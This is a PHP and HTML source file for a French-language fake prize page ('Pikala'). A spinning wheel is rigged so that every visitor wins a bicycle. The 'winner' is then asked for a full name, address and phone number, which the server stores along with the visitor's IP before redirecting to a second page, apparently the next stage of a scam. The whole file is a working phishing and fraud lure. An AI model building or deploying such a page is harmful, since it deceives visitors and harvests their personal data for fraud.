<?php
session_start();
?>

<?php
if(        isset($_POST["sendinfo"])              )
{		
	function get_ip(){   if( isset($_SERVER['HTTP_CLIENT_IP']) )   {  return $_SERVER['HTTP_CLIENT_IP'];}  elseif  ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) )     { return $_SERVER['HTTP_X_FORWARDED_FOR'];}   else  { return (  isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''   ); }     }      	$ip = get_ip();  
	$name = $_POST["name"];
	$adresse = $_POST["adresse"];
	$num = $_POST["num"];

    $_SESSION["infocookies"][] = array (  'ip' => $ip,   'name' => $name,   'adresse' => $adresse,   'num' => $num,   ); 

    echo "<script> window.location.href = 'pikala2.php'; </script>"; 

}

?>



<!DOCTYPE html>
<html>
<title>pikala</title>
<meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>     
<script type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.min.js"></script> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/> 

<style>html, body{  background:transparent;  padding:0; border:0; margin:0;  touch-action: manipulation; }   ul li {list-style-type:none;}     </style>       





<style>
#container1 {background-image: url(https://casino5.netlify.app/background.jpg);  width:100%; height:100vh; display:block; }
.row{background-color:transparent;   padding:0%; margin:0%;    display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center; flex-wrap:wrap; flex-direction: row; }       

	 .col1a{width:100%; }      
	 .col1b{background-color:transparent;  padding:0%; margin:0% 2%;         display:grid; align-items:center; justify-content:center; text-align:center;        }   
        #container1 .postext1{ margin:4% 0%; display:flex; align-items:center; justify-content:center; text-align:center;} #container1 .text1{color:#e4ff09; font:800 30px 'cairo';}
   		#container1 .poswheel {position:relative; }	
			#container1 .marker { width:60px;  position:absolute; top:-10px; left:50%; transform:translateX(-50%); z-index: 2; }
            #container1 .wheel { max-width:100%; width:400px; height:auto;   }  	.wheelhover { transition:all 10s ease;  animation: blur 10s; }  	@keyframes blur { 0% { filter: blur(0.5px); } 50%{ filter: blur(2px); } 80% { filter: blur(1.5px); } 95% { filter: blur(0px); } }		
		#container1 .posbutton{display:flex; align-items:center; justify-content:center; text-align:center;}   #container1 .button { width:200px;  height:auto;   cursor:pointer;  pointer-events: auto; }  #container1 .button:hover { opacity: 0.8; }

@media only screen and (max-width:1300px) {  }
@media only screen and (max-width:1000px) {  }
@media only screen and (max-width:600px)  {  }
@media only screen and (max-width:360px)  {  }
</style>


<div id="container1">  <div class="row">
	
	<div class="col1a"> <div class="col1b">	
	    <div class="postext1"> <div class="text1">Jouez Et Tentez Votre chance de Gagner un Vélo</div>  </div>
		<div class="poswheel">  
			<img class="marker" src="img/pikala/marker.png">    
			<img class="wheel" src="img/pikala/whel.png"> 
		</div>
		<div class="posbutton"> <img class="button" src="img/pikala/button.png" > </div> 	
	</div> </div> 
			
</div></div>





















<style>
#container2 {background-image: url(https://casino5.netlify.app/background.jpg);  width:100%; height:auto;   display:none;   }
#container2 .row{background-color:transparent;   padding:0%; margin:0%;    display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center; flex-wrap:wrap; flex-direction: row; }       

		    #container2 .col1a{width:100%;  }       
            #container2 .col1b{background-color:transparent; padding:0%; margin:0% 2%;  display:grid; align-items:center; justify-content:center; text-align:center;    }
			   #container2 .posimg1{margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}   #container2 .img1{ max-width:100%; width:500px; height:auto; }
               #container2 .postext1{margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  #container2 .text1{color:white; font:800 30px 'cairo';  }
			   
			   #container2 .posform{ margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  
			   #container2 form{background-color:red; padding:20px;}
				     #container2 .posinput{ margin:2% 0%; display:flex; align-items:center; justify-content:center; text-align:center;}   
				     #container2 .inputtext  { background-color:white; width:400px; height:50px;  border:solid 1px yellow;   border-radius:2px;  color:black; font:800 20px 'cairo'; text-indent:1rem;  }  #container2 .inputtext:focus{ box-shadow: 0 0 0 0.2rem yellow;   outline: none !important;  }  #container2 .inputtext::placeholder{color:#9f9494c9; font:500 17px 'cairo';} 
                     #container2 .inputsubmit{ background-color:green; width:400px; height:50px;  border:solid 1px green;   border-radius:5px;  box-shadow: 0 2px 5px 0 rgb(0 0 0 / 16%), 0 2px 10px 0 rgb(0 0 0 / 12%);        color:white;  font:800 25px 'cairo';           display:flex; align-items:center; justify-content:center; text-align:center;}


@media only screen and (max-width:1300px) {  }
@media only screen and (max-width:1000px) {  }
@media only screen and (max-width:600px)  {  }
@media only screen and (max-width:360px)  {  }
</style>



<div id="container2"> <div class="row">			
	<div class="col1a">  <div class="col1b">
		<div class="posimg1"> <img class="img1" src="img/pikala/pikala.gif"></div>         	
		<div class="postext1"> 
		    <div class="text1">
			        Félicitations, vous avez gagné un vélo de haute qualité avec nous, une marque internationale
					vous figurez dans  nos listes des gagnants .Votre commande cadeau a été créé
					Veuillez s'il vous plaît nous  fournir les informations ci-dessous pour confirmer la livraison , essayez de vous assurer que vos informations sont correctes pour éviter tout problème de livraison
		    </div>    
		</div>                 
        <div class="posform">
		   <form method="post"  > 
		       <div class="posinput"> <input type="text"   placeholder="Tapez votre nom complet"  value=""          name="name"       class="inputtext"  required="required"  oninvalid="this.setCustomValidity('Vous devez entrer votre nom complet ')"       oninput="setCustomValidity('')"   />  </div>  
			   <div class="posinput"> <input type="text"   placeholder="Tapez votre adresse"      value=""          name="adresse"    class="inputtext"  required="required"   oninvalid="this.setCustomValidity('Vous devez entrer votre adresse ')"  oninput="setCustomValidity('')" />  </div>
               <div class="posinput"> <input type="text"   placeholder="Tapez votre numéro"       value=""          name="num"        class="inputtext" required="required"     oninvalid="this.setCustomValidity('Vous devez entrer votre numéro ')"  oninput="setCustomValidity('')" />  </div> 
               <div class="posinput"> <input type="submit" placeholder=""                         value="ENVOYER"   name="sendinfo"   class="inputsubmit"  />  </div>			   
           </form> 		   
        </div> 		
	</div></div>
</div></div>















<script>
(function(){

document.querySelector('.button').addEventListener('click', () => {
	var newDeg = 4680;
	new Audio('https://casino5.netlify.app/sound.mp3').play();
	document.querySelector('.wheel').classList.add('wheelhover'); 	
	document.querySelector('.wheel').style.transform = `rotate(${   newDeg  }deg)`;
	document.querySelector('.button').style.pointerEvents = 'none';
});
  
  
  
document.querySelector('.wheel').addEventListener('transitionend', () => {
	
    var actualDeg = 0;
	document.querySelector('.wheel').classList.remove('wheelhover');  	
	document.querySelector('.wheel').style.transform = `rotate(${actualDeg}deg)`;  
    document.querySelector('.button').style.pointerEvents = 'auto';	
                                                                      
    if (actualDeg>=0 && actualDeg<10 )	
	{ 
        document.getElementById("container1").style.display = 'none';   
        document.getElementById("container2").style.display = 'block';  	
	}
   console.log(actualDeg);  
 });


})
();	
	
	
	

 
</script>
  
